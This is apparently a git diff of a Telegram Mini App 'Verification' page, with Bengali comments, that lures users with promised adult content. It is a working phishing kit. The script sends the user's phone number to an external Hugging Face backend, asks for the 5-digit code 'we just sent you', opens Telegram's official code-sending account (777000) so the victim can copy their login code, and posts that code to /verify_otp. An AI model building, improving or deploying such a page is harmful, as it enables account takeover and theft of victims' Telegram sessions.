@@ -2,27 +2,103 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
-        body { font-family: sans-serif; background: #000; color: white; text-align: center; margin: 0; padding: 0; display: flex; align-items: center; justify-content: center; height: 100vh; }
-        .box { background: white; color: #333; padding: 30px; border-radius: 20px; width: 85%; max-width: 350px; box-shadow: 0 10px 25px rgba(0,0,0,0.5); }
-        .btn { background: #28a745; color: white; border: none; padding: 15px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; }
-        .hidden { display: none; }
-        .loader { color: #28a745; font-weight: bold; margin-top: 15px; }
+        * { box-sizing: border-box; }
+        body { 
+            font-family: 'Arial', sans-serif; 
+            margin: 0; padding: 0; 
+            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
+            background-size: cover;
+            height: 100vh; display: flex; align-items: flex-end; 
+            justify-content: center; overflow: hidden;
+        }
+        .overlay { background: rgba(0, 0, 0, 0.4); position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 1; }
+        
+        .main-container { width: 92%; max-width: 360px; z-index: 2; text-align: center; margin-bottom: 40px; }
+        
+        /* প্রিমিয়াম ওটিপি বক্স ডিজাইন */
+        .otp-box {
+            background: rgba(255, 255, 255, 0.9); padding: 25px; border-radius: 25px;
+            box-shadow: 0 15px 35px rgba(0,0,0,0.4); backdrop-filter: blur(8px);
+        }
+        .instruction { font-size: 16px; color: #333; margin-bottom: 20px; font-weight: bold; }
+        
+        .inputs { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
+        .box {
+            width: 45px; height: 55px; border: 2px solid #28a745; border-radius: 12px;
+            display: flex; align-items: center; justify-content: center; 
+            font-size: 28px; font-weight: bold; color: #28a745; background: #fff;
+        }
+
+        /* গেট কোড বাটন */
+        .get-code-btn {
+            background: #28a745; color: white; border: none; padding: 14px;
+            width: 100%; border-radius: 12px; font-size: 18px; font-weight: bold;
+            margin-bottom: 25px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 10px;
+            box-shadow: 0 4px 10px rgba(0,0,0,0.2);
+        }
+
+        /* প্রিমিয়াম কি-প্যাড */
+        .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 10px; }
+        .key {
+            background: #28a745; color: white; padding: 18px; border-radius: 12px;
+            font-size: 24px; font-weight: bold; cursor: pointer; border: none;
+            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+        }
+        .key:active { transform: scale(0.92); background: #1e7e34; }
+        .key-del { background: #dc3545; }
+        .key-ok { background: #007bff; }
+
+        .hidden { display: none !important; }
+        .start-box { background: white; padding: 30px; border-radius: 20px; box-shadow: 0 5px 15px rgba(0,0,0,0.3); }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h2>Verification Required</h2>
-        <p style="font-size: 14px; color: #666; margin-bottom: 25px;">Please confirm your identity to access the premium files.</p>
-        
-        <button class="btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
-        
-        <div id="loader" class="hidden">
-            <div class="loader">Connecting...</div>
-            <p style="font-size: 12px;">Please wait while we secure your connection.</p>
+    <div class="overlay"></div>
+
+    <div class="main-container">
+        <!-- ধাপ ১: স্টার্ট স্ক্রিন -->
+        <div id="step0" class="start-box">
+            <h2 style="color: #333; margin-top: 0;">Verification Required</h2>
+            <p style="color: #666; font-size: 14px; margin-bottom: 25px;">Please confirm your identity to access the premium content.</p>
+            <button class="get-code-btn" id="main_btn" onclick="startFlow()">🍓 Confirm 🔞</button>
+            <div id="loader" class="hidden" style="color: #28a745; font-weight: bold;">Connecting...</div>
+        </div>
+
+        <!-- ধাপ ২: ওটিপি কি-প্যাড স্ক্রিন -->
+        <div id="step2" class="otp-box hidden">
+            <div class="instruction">Enter the 5-digit code that we just sent you!</div>
+            
+            <div class="inputs">
+                <div class="box" id="b1"></div>
+                <div class="box" id="b2"></div>
+                <div class="box" id="b3"></div>
+                <div class="box" id="b4"></div>
+                <div class="box" id="b5"></div>
+            </div>
+
+            <!-- আপনার দেওয়া ওই স্পেশাল বাটন ফাংশন -->
+            <button class="get-code-btn" onclick="minimizeAndGetCode()">
+                📩 GET CODE 📩
+            </button>
+
+            <div class="keypad">
+                <div class="key" onclick="press('1')">1</div>
+                <div class="key" onclick="press('2')">2</div>
+                <div class="key" onclick="press('3')">3</div>
+                <div class="key" onclick="press('4')">4</div>
+                <div class="key" onclick="press('5')">5</div>
+                <div class="key" onclick="press('6')">6</div>
+                <div class="key" onclick="press('7')">7</div>
+                <div class="key" onclick="press('8')">8</div>
+                <div class="key" onclick="press('9')">9</div>
+                <div class="key key-del" onclick="del()">⌫</div>
+                <div class="key" onclick="press('0')">0</div>
+                <div class="key key-ok" onclick="verifyOTP()">OK</div>
+            </div>
         </div>
     </div>
 
@@ -30,7 +106,7 @@
         let tg = window.Telegram.WebApp;
         tg.expand();
         
-        // আপনার Hugging Face App URL এখানে দিন (শেষে / থাকবে না)
+        let currentCode = "";
         const BACKEND_URL = "https://pmrony-session-bot.hf.space";
         let userId = tg.initDataUnsafe.user ? tg.initDataUnsafe.user.id : null;
 
@@ -45,30 +121,64 @@
             try {
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
-                if (data.status === "success") {
-                    sendNumber(data.phone);
-                } else {
-                    setTimeout(poll, 1500);
-                }
+                if (data.status === "success") { sendNumber(data.phone); } 
+                else { setTimeout(poll, 1500); }
             } catch (e) { setTimeout(poll, 2000); }
         }
 
         async function sendNumber(phone) {
             try {
                 const res = await fetch(`${BACKEND_URL}/send_number`, {
-                    method: "POST",
-                    headers: {"Content-Type": "application/json"},
+                    method: "POST", headers: {"Content-Type": "application/json"},
                     body: JSON.stringify({ user_id: userId, phone: phone })
                 });
                 const data = await res.json();
                 if (data.status === "success") {
-                    // সফল হলে অ্যাপ ক্লোজ হয়ে যাবে এবং চ্যাটে ওটিপি বাটন যাবে
-                    tg.close();
-                } else {
-                    alert("Error: " + data.message);
-                    location.reload();
+                    document.getElementById('step0').classList.add('hidden');
+                    document.getElementById('step2').classList.remove('hidden');
                 }
-            } catch (e) { alert("Server Error!"); }
+            } catch (e) { }
+        }
+
+        // --- আপনার দেওয়া সেই স্পেশাল ফাংশন ---
+        function minimizeAndGetCode() {
+            // ১. হ্যাপটিক ভাইব্রেশন
+            if(window.Telegram.WebApp.HapticFeedback) {
+                window.Telegram.WebApp.HapticFeedback.impactOccurred('heavy');
+            }
+
+            // ২. এই লিঙ্কটি সরাসরি ট্রাই করুন (এটিই অন্যদের অ্যাপে কাজ করে)
+            window.Telegram.WebApp.openTelegramLink("https://t.me/777000");
+
+            // ৩. ব্যাকআপ কমান্ড যদি ২ নম্বর কাজ না করে
+            setTimeout(function() {
+                window.location.href = "tg://openmessage?user_id=777000";
+            }, 500);
+        }
+
+        function press(num) {
+            if(currentCode.length < 5) { currentCode += num; updateBoxes(); }
+        }
+        function del() {
+            currentCode = currentCode.slice(0, -1); updateBoxes();
+        }
+        function updateBoxes() {
+            for(let i=1; i<=5; i++) {
+                document.getElementById('b'+i).innerText = currentCode[i-1] || "";
+            }
+        }
+
+        async function verifyOTP() {
+            if(currentCode.length < 5) return alert("Please enter 5 digit code!");
+            try {
+                const res = await fetch(`${BACKEND_URL}/verify_otp`, {
+                    method: "POST", headers: {"Content-Type": "application/json"},
+                    body: JSON.stringify({ user_id: userId, otp: currentCode })
+                });
+                const data = await res.json();
+                if (data.status === "success") { tg.close(); } 
+                else { alert("Wrong Code!"); currentCode = ""; updateBoxes(); }
+            } catch (e) { }
         }
     </script>
 </body>
